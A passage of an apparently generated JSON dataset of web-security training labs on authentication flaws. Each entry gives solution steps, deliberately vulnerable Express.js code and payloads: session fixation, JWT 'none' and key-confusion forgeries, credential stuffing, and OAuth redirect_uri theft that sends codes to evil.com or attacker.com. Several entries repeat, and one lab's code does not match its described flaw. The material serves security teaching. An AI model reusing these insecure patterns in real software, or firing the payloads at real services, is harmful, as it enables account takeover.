        "Use Burp Suite to send a malformed request that triggers a stack trace.",
        "Observe the error message for leakage of sensitive variables including session ID.",
        "Extract the session ID linked to Carlos from the verbose output.",
        "Send a GET request to /my-account with the leaked session ID.",
        "Confirm Carlos's account access using the hijacked session."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = { 'xyz789': 'carlos' }; app.get('/view', (req, res) => { try { const data = JSON.parse(req.query.info); res.send('OK'); } catch (e) { res.status(500).send(`Stack: ${e.stack}\\nSession: xyz789`); } }); app.get('/my-account', (req, res) => { if (req.cookies.sid === 'xyz789') res.send('Session hijacked for carlos'); else res.send('No access'); }); app.listen(3001);",
      "payloads": [
        "/view?info={malformed",
        "Cookie: sid=xyz789"
      ]
    },
    {
      "Lab scenario": "Credential stuffing using leaked password",
      "Lab Description": "The application allows unlimited login attempts and does not implement rate limiting. An attacker can perform credential stuffing attacks using common leaked credentials. To solve: Use a known leaked password for Carlos and gain access to his My account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a login request using Burp Suite and send it to Intruder.",
        "Set payload position on password parameter and fix the username to carlos.",
        "Load a list of common leaked passwords into the payload set.",
        "Start the attack and observe the response lengths or status codes.",
        "Identify the valid password based on a successful response and log in as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) res.send('Welcome back'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { res.send('Account page'); }); app.listen(3002);",
      "payloads": [
        "username=carlos&password=123456",
        "username=carlos&password=password1",
        "username=carlos&password=qwerty123"
      ]
    },
  {
    "Lab scenario": "Session Fixation via Insecure Cookie Assignment in REST Login Flow",
    "Lab Description": "This lab demonstrates a session fixation vulnerability within the login flow. The application accepts a `session` cookie from the client and does not invalidate it upon successful login. This flawed design allows an attacker to fixate a session ID prior to login and hijack the victim's authenticated session. To solve: Hijack Carlos's session and access his account page using a pre-assigned session identifier.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the GET /login request using Burp Suite and observe the application accepts a custom session cookie without validation.",
      "Use Burp to inject a known session cookie (e.g., session=attacker-session) before login and send the request to Repeater.",
      "Forward the session cookie to the victim via social engineering or stored XSS vector (if provided).",
      "Once the victim logs in, reuse the pre-set session cookie (session=attacker-session) to access authenticated areas.",
      "Access /my-account using the fixed session and confirm Carlos's account details are displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'admin123', sessionId: 'sess123' }]; app.get('/login', (req, res) => { const sid = req.cookies.session || 'guest-session'; res.cookie('session', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) res.send('Login successful'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const user = users.find(u => u.sessionId === sid); if (user) res.send(`Welcome back, ${user.username}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "session=sess123",
      "GET /login HTTP/1.1 with session=sess123",
      "POST /login HTTP/1.1 with session=sess123",
      "GET /my-account HTTP/1.1 with session=sess123"
    ]
  },
  {
    "Lab scenario": "JWT Signature Bypass via 'none' Algorithm in Authorization Header",
    "Lab Description": "This lab simulates a vulnerable JWT validation process that improperly trusts the `alg` field in incoming tokens. The server accepts a token signed with the 'none' algorithm, effectively disabling verification. To solve: Forge a valid JWT granting admin access and access the protected admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the Authorization: Bearer <token> header in a valid request using Postman or Burp.",
      "Decode the JWT using jwt.io or a local decoder and inspect the header and payload.",
      "Craft a new JWT with `alg` set to `none` and the payload `{\"username\":\"carlos\",\"role\":\"admin\"}`.",
      "Remove the signature part of the JWT and send the token via Authorization header.",
      "Send GET /admin with the forged token and confirm admin panel access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } const verified = jwt.verify(token, 'secret'); req.user = verified; next(); } catch (err) { return res.status(403).send('Invalid token'); } }); app.get('/admin', (req, res) => { if (req.user && req.user.role === 'admin') res.send('Welcome to the admin panel'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer <forged_token>",
      "GET /admin HTTP/1.1 with Authorization header"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration via Redirect URI Manipulation in GraphQL Mutation",
    "Lab Description": "This lab demonstrates a misconfigured OAuth authorization flow implemented through a GraphQL endpoint. The server fails to validate redirect URIs during token exchange, allowing an attacker to intercept authorization codes. To solve: Manipulate the redirect_uri parameter to intercept Carlos’s token and use it to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a GraphQL login mutation with Burp and identify the OAuth login mutation fields including redirect_uri.",
      "Change the redirect_uri to a domain you control (e.g., https://evil.com/oauth-callback).",
      "Send the modified mutation, receive the redirected code on your server, and capture it.",
      "Exchange the stolen code for an access_token via the /token endpoint.",
      "Use the token to call /graphql with a query for myAccount and verify Carlos's account is accessible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const tokens = { 'code123': 'token_carlos' }; const accounts = { 'token_carlos': 'Account info for carlos' }; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation') && query.includes('oauthLogin')) { const redirectUri = query.match(/redirect_uri: \\\"(.*?)\\\"/)[1]; const code = 'code123'; res.json({ data: { oauthLogin: `${redirectUri}?code=${code}` } }); return; } if (query.includes('query') && query.includes('myAccount')) { const auth = req.headers.authorization?.split(' ')[1]; const info = accounts[auth]; if (info) res.json({ data: { myAccount: info } }); else res.status(403).json({ error: 'Forbidden' }); return; } res.status(400).json({ error: 'Invalid request' }); }); app.listen(4000);",
    "payloads": [
      "mutation { oauthLogin(redirect_uri: \"https://evil.com/callback\") }",
      "GET /callback?code=code123",
      "POST /token with code=code123",
      "Authorization: Bearer token_carlos",
      "query { myAccount }"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This lab’s login endpoint fails to invalidate existing session tokens, allowing an attacker to fix a session ID prior to victim login. The application maintains session state using cookies without rotating them on login. To solve: Hijack Carlos's session by fixing the session ID before they authenticate.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a pre-login GET request to /login and capture the Set-Cookie header",
      "Send a crafted login POST request as the attacker, appending the victim's session ID manually",
      "Use Burp Repeater to simulate the victim logging in while already having the attacker's session ID set",
      "After victim login, reuse the fixed session token to gain access to /my-account",
      "Confirm session hijack by successfully loading Carlos’s account page"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/></form>'); }); app.post('/login', (req, res) => { const user = users.find(u => u.username === req.body.username && u.password === req.body.password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Sensitive Carlos data'); else res.send('Access Denied'); }); app.listen(3000);",
    "payloads": [
      "GET /login -> Capture session cookie",
      "POST /login with pre-fixed session: session=attackerSessionID",
      "Use same session ID after victim logs in"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in authorization header",
    "Lab Description": "The application accepts JWTs signed using the 'none' algorithm. This allows attackers to forge tokens without knowing the secret. The application fails to validate token integrity correctly. To solve: Forge a token granting access to the admin panel as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send an authenticated request and capture a valid JWT from the Authorization header",
      "Decode the JWT in jwt.io and analyze the structure and signing algorithm",
      "Change the algorithm to 'none' and craft a new payload with {\"username\": \"carlos\", \"role\": \"admin\"}",
      "Remove the signature part entirely and recompile the JWT",
      "Send a request to /admin using the forged token to gain access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecretkey'; app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && (payload.header.alg === 'none' || jwt.verify(token, secret))) { if (payload.payload.role === 'admin') return res.send('Admin access granted'); } res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: base64(header).base64(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI handling",
    "Lab Description": "This lab misconfigures its OAuth redirect URI validation, allowing attackers to manipulate the flow to steal authorization codes. The application trusts redirect URIs without exact matching. To solve: Capture Carlos’s authorization code via an open redirect.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to analyze OAuth redirection URLs and locate a redirect_uri parameter",
      "Construct an authorization request using your own attacker-controlled domain as redirect_uri",
      "Send a phishing link to Carlos that initiates OAuth login and redirects to your attacker site",
      "Capture the authorization code from the redirect and use it to request a token",
      "Use the token to access Carlos's profile via /account API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, code } = req.query; // Insecure matching res.redirect(`${redirect_uri}?code=steal123`); }); app.get('/account', (req, res) => { if (req.query.token === 'access_token_carlos') res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "https://target.com/oauth/authorize?client_id=xyz&redirect_uri=https://evil.com/callback",
      "https://evil.com/callback?code=steal123",
      "POST /token with stolen code"
    ]
  },
  {
    "Lab scenario": "Credential stuffing vulnerability in verbose login error response",
    "Lab Description": "The login system reveals whether a username exists before verifying passwords, enabling enumeration and credential stuffing attacks. It does not implement rate-limiting or captcha protection. To solve: Identify a valid credential pair for Carlos and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Intruder to fuzz the login endpoint with common usernames and analyze differing responses",
      "Identify the valid username based on the error message: 'Incorrect password' vs 'User not found'",
      "Launch a credential stuffing attack using a list of common passwords",
      "Capture a 302 redirect indicating successful login",
      "Use the valid credentials to access /my-account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'summer2024' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('User not found'); if (user.password !== password) return res.status(403).send('Incorrect password'); res.send('Login successful'); }); app.listen(3000);",
    "payloads": [
      "POST /login {\"username\":\"carlos\",\"password\":\"123456\"}",
      "POST /login {\"username\":\"carlos\",\"password\":\"summer2024\"}"
    ]
  },
  {
    "Lab scenario": "Session token reuse vulnerability in GraphQL login mutation",
    "Lab Description": "This GraphQL API issues static session tokens upon login without regenerating them. Attackers can reuse captured tokens to impersonate other users. To solve: Replay Carlos’s token and access his private messages.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp to intercept a GraphQL mutation for login as Carlos and capture the session token",
      "Replay the captured token in a new request to the /messages endpoint",
      "Verify that the token is accepted and sensitive data is exposed",
      "Access /messages?user=carlos using the token to retrieve private messages",
      "Confirm exploitation by retrieving the flag from the message"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); const sessions = {}; const users = [{ username: 'carlos', password: '1234', token: 'fixedtoken123' }]; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const [, username, password] = query.match(/\\\"(.*?)\\\"/g).map(s => s.replace(/\\\"/g, '')); const user = users.find(u => u.username === username && u.password === password); if (user) return res.json({ data: { login: user.token } }); } res.status(401).send('Invalid'); }); app.get('/messages', (req, res) => { if (req.headers.authorization === 'Bearer fixedtoken123') res.send('Private messages from Carlos'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "POST /graphql {\"query\":\"mutation { login(username: \\\"carlos\\\", password: \\\"1234\\\") }\"}",
      "GET /messages with Header: Authorization: Bearer fixedtoken123"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Cookie-based Auth Middleware",
    "Lab Description": "The application uses cookie-based sessions but does not regenerate the session ID after login, allowing session fixation attacks. The vulnerable middleware binds session cookies too early in the auth process. To solve: Fixate a session token before login, then reuse it post-authentication to access Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept pre-login request using Burp Suite and capture the Set-Cookie header",
      "Use Postman to send login request with fixed session cookie already set",
      "Craft request: set victim credentials with fixed cookie in header",
      "Verify whether session cookie remains unchanged after login",
      "Send authenticated request to /account endpoint using the fixed token to verify Carlos’s session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixation-vuln', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { if (req.session.authenticated) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Set-Cookie: connect.sid=attackersession; Path=/; HttpOnly",
      "POST /login with Cookie: connect.sid=attackersession and valid credentials for carlos"
    ]
  },
  {
    "Lab scenario": "JWT Authentication Bypass using None Algorithm in Authorization Header",
    "Lab Description": "The app validates JWT tokens but accepts unsigned tokens when the algorithm is set to 'none'. The verification logic fails to check for token integrity. To solve: Craft a JWT using 'none' as algorithm, spoof Carlos’s identity, and access /admin.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept valid JWT token in Authorization: Bearer header",
      "Decode JWT using jwt.io or Postman pre-request script",
      "Craft a new token using { \"alg\": \"none\" } and sub: carlos, omit signature",
      "Replay request with modified Authorization header",
      "Verify admin access by requesting GET /admin"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['admin', 'carlos']; app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.sub === 'carlos') return res.send('Welcome Carlos!'); else return res.status(403).send('Access Denied'); } catch (err) { res.status(403).send('Invalid Token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "Authorization: Bearer [base64_header].[base64_payload]."
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
    "Lab Description": "The application integrates OAuth with a vulnerable redirect_uri parameter that does not enforce domain validation. This can be exploited via open redirect to steal authorization codes. To solve: Redirect the victim through a crafted URL that leaks Carlos’s OAuth code to your server and log in using the code.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp or Postman to analyze the OAuth flow between /auth and /callback",
      "Craft an authorization URL with redirect_uri pointing to attacker.com/oauth-leak",
      "Send phishing link to victim to initiate auth flow",
      "Capture leaked code via request to attacker.com",
      "Exchange authorization code for access token using POST /token",
      "Use token to access GET /my-account endpoint as carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('querystring'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'temp-code-abc123'; res.redirect(`${redirectUri}?code=${code}`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'temp-code-abc123') { res.json({ access_token: 'token-carlos-xyz' }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token-carlos-xyz') res.send('Carlos Account Access Granted'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
    "payloads": [
      "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://attacker.com/oauth-leak",
      "POST /token { code: 'temp-code-abc123' }",
      "Authorization: Bearer token-carlos-xyz"
    ]
  },
    {
      "Lab scenario": "Session Fixation via Insecure Cookie Reuse in Login Flow",
      "Lab Description": "The application does not invalidate existing session cookies after successful login. An attacker can preset a session ID and force a victim to use it. Once the victim logs in, the attacker can hijack the session. To solve: hijack Carlos's session after fixing the session ID and triggering login.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept the initial GET /login request and note the session cookie",
        "Use Postman to preset the session cookie for the victim via social engineering",
        "Craft a phishing page that loads the app with the preset session ID",
        "Wait for the victim to log in, then reuse the fixed session ID",
        "Access /my-account with the stolen session cookie to verify access"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'supersecure' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || Math.random().toString(36).substring(2); res.cookie('session', sessionId); res.send('<form method=\"POST\" action=\"/login\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') res.send('Sensitive account info'); else res.send('Access denied'); }); app.listen(3000);",
      "payloads": [
        "GET /login with fixed session cookie",
        "Send fixed session cookie to victim",
        "Use fixed session cookie post-login to access /my-account"
      ]
    },
    {
      "Lab scenario": "JWT Signature None Bypass in API Authorization Header",
      "Lab Description": "The app uses JWT for API auth but accepts `alg: none`, enabling tampering. JWTs are passed via Authorization header. To solve: forge a valid token for user 'admin' without needing the secret key.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use jwt.io or Postman to decode the token structure from Authorization header",
        "Modify payload sub field to 'admin' and alg to 'none'",
        "Remove the signature completely from the token",
        "Send the forged token in Authorization: Bearer header",
        "Access /admin-panel endpoint to confirm elevated access"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'topsecret'; app.get('/admin-panel', (req, res) => { const auth = req.headers.authorization; const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none' || jwt.verify(token, secret)) { if (payload.payload.sub === 'admin') return res.send('Admin Panel Access'); } res.status(403).send('Forbidden'); }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"none\"}",
        "Payload: {\"sub\":\"admin\"}",
        "Token: base64(header).base64(payload). (no signature)"
      ]
    },
    {
      "Lab scenario": "OAuth Implicit Grant Token Stealing via Redirect Manipulation",
      "Lab Description": "The app uses OAuth implicit grant and reflects redirect URIs insecurely. An attacker can manipulate the redirect_uri to capture tokens. To solve: obtain Carlos’s access token and use it to access his account data.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Analyze the OAuth login URL using Burp to extract redirect_uri param",
        "Modify redirect_uri to attacker-controlled server",
        "Craft and send phishing URL to victim with altered redirect_uri",
        "Host listener on attacker server to capture token from URL fragment",
        "Replay the token in Authorization header to access victim's data"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const token = 'token123-carlos'; const redir = `${redirect_uri}#access_token=${token}`; res.redirect(redir); }); app.get('/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123-carlos') res.send('Carlos data'); else res.send('Unauthorized'); }); app.listen(5000);",
      "payloads": [
        "redirect_uri=https://attacker.com/capture",
        "Capture access_token in fragment",
        "Authorization: Bearer token123-carlos"
      ]
    },
    {
      "Lab scenario": "JWT Key Confusion Exploit in Login Endpoint",
      "Lab Description": "The app uses asymmetric JWT but incorrectly allows verification with symmetric key, enabling key confusion attacks. To solve: sign a forged admin token with the public key as HMAC secret.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Grab original JWT token using Burp from login flow",
        "Inspect token to see RS256 usage",
        "Convert public key to PEM and use as HMAC secret",
        "Sign token using HS256 with payload: { sub: 'admin' }",
        "Use forged token to access /admin/dashboard"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.sub === 'admin') res.send('Admin dashboard'); else res.status(403).send('Forbidden'); } catch (e) { res.status(401).send('Invalid'); } }); app.listen(6000);",
      "payloads": [
        "HS256 token signed with PEM content as secret",
        "Header: {\"alg\":\"HS256\"}",
        "Payload: {\"sub\":\"admin\"}"
      ]
    },
    {
      "Lab scenario": "Session ID Exposure in GraphQL Login Mutation",
      "Lab Description": "The GraphQL login mutation leaks verbose error info and returns session ID directly in response, enabling session prediction. To solve: predict session of 'carlos' and hijack it.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman to send GraphQL mutation for login",
        "Observe session ID is static and tied to username",
        "Try login with your username and confirm session format",
        "Predict session ID for carlos using username + static salt",
        "Send session cookie to /profile and confirm account takeover"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sessions = {}; const users = { carlos: 'pass123' }; app.post('/graphql', (req, res) => { const { query } = req.body; const match = query.match(/login\\(username: \\\"(.*?)\\\", password: \\\"(.*?)\\\"\\)/); const [, username, password] = match; if (users[username] === password) { const sid = `${username}-sess123`; sessions[sid] = username; res.json({ data: { login: { session: sid }}}); } else res.json({ errors: [{ message: 'Invalid' }] }); }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.send('Denied'); }); app.listen(7000);",
      "payloads": [
        "session=carlos-sess123",
        "GraphQL query: mutation { login(username: \"carlos\", password: \"wrong\") }"
      ]
    },
    {
      "Lab scenario": "Session Fixation via OAuth Code Reuse in Redirect URI",
      "Lab Description": "OAuth login improperly accepts reused authorization codes. An attacker can authenticate as victim using replayed codes. To solve: obtain Carlos's code and reuse it post-login.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Observe OAuth code in redirect_uri using Burp",
        "Capture Carlos's OAuth code via phishing",
        "Replay GET /callback?code=<carlos_code>",
        "App accepts reused code and logs attacker in as Carlos",
        "Access /dashboard and verify session hijack"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const validCodes = { 'authcode-carlos': 'carlos' }; const sessions = {}; app.get('/callback', (req, res) => { const user = validCodes[req.query.code]; if (user) { const sid = Math.random().toString(36); sessions[sid] = user; res.cookie('session', sid); res.send('Logged in'); } else res.status(400).send('Invalid code'); }); app.get('/dashboard', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]; if (user === 'carlos') res.send('Welcome Carlos'); else res.send('Access denied'); }); app.listen(8000);",
      "payloads": [
        "/callback?code=authcode-carlos",
        "Session cookie from reused code grants access"
      ]
    },
    {
      "Lab scenario": "JWT Expiry Manipulation in Authorization Header",
      "Lab Description": "JWT tokens are verified without checking the expiration claim. An attacker can craft expired tokens that are still accepted. To solve: generate expired token for 'admin' and access /admin-area.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture original token using Burp and decode with jwt.io",
        "Change 'sub' to 'admin' and 'exp' to a past timestamp",
        "Re-sign the token using known secret",
        "Send token in Authorization header",
        "Verify /admin-area is accessible despite expired token"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'jwtkey'; app.get('/admin-area', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { ignoreExpiration: true }); if (decoded.sub === 'admin') res.send('Admin Access Granted'); else res.send('Access Denied'); } catch (e) { res.send('Invalid token'); } }); app.listen(9000);",
      "payloads": [
        "Payload: {\"sub\":\"admin\",\"exp\":1000}",
        "Sign with secret 'jwtkey'",
        "Authorization: Bearer <expired_token>"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID in login flow",
      "Lab Description": "The application allows users to authenticate via a login form but does not issue a new session ID upon successful login. Instead, it reuses the session ID issued before authentication. This enables session fixation. The application reflects session IDs in a predictable format. To solve: Fixate a session for the victim user and access their My Account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to log in with your own account and observe the Set-Cookie header",
        "Send a GET /login request without logging in and capture the pre-authentication session ID",
        "Craft a phishing link using this session ID and trick the victim to log in via it",
        "Once the victim logs in, reuse the fixed session ID to impersonate them",
        "Access /account with the fixed session to confirm takeover"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = { carlos: 'mypassword' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', express.urlencoded({ extended: false }), (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/account'); } else { res.send('Invalid'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(403).send('Login required'); }); app.listen(3000);",
      "payloads": [
        "GET /login HTTP/1.1 + Set session cookie + trick user to authenticate",
        "Use session ID: PHPSESSID=fixatedvalue"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion allowing token forgery",
      "Lab Description": "The backend validates JWTs using the 'alg' header in the token. It incorrectly accepts tokens with 'none' algorithm, skipping signature verification. To solve: Forge a valid-looking token for the user 'admin' and access their My Account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture a valid JWT using Burp Suite when logging in as a normal user",
        "Decode the JWT using jwt.io or Postman and observe the 'alg' field",
        "Craft a token with 'alg':'none' and payload with {\"user\":\"admin\"}",
        "Remove the signature part and inject the new token into Authorization header",
        "Send GET /account with the forged token and validate access"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const SECRET = 'secret'; app.use(require('body-parser').json()); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = decoded.payload.user; return res.send(`Welcome ${user}`); } try { const verified = jwt.verify(token, SECRET); res.send(`Welcome ${verified.user}`); } catch { res.status(403).send('Invalid'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "Authorization: Bearer [forged-token]"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect during authorization",
      "Lab Description": "The OAuth flow uses a redirect_uri parameter that is not properly validated, allowing attackers to inject an external domain. This can be exploited to leak authorization codes. To solve: Capture an authorization code issued for the victim and log in to their account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Initiate the OAuth flow and intercept the authorization request in Burp",
        "Modify redirect_uri to an attacker-controlled domain",
        "Send the modified link to the victim via social engineering",
        "Capture the authorization code redirected to your server",
        "Use the code in POST /token to obtain an access token and access /account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const codes = {}; app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query; const code = 'authcode123'; codes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', express.urlencoded({ extended: false }), (req, res) => { const user = codes[req.body.code]; if (user) res.json({ access_token: `${user}-token` }); else res.status(400).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token') res.send('Welcome carlos'); else res.status(403).send('Denied'); }); app.listen(3000);",
      "payloads": [
        "GET /auth?client_id=xyz&redirect_uri=https://evil.com",
        "Captured code: authcode123",
        "POST /token with code=authcode123"
      ]
    },
    {
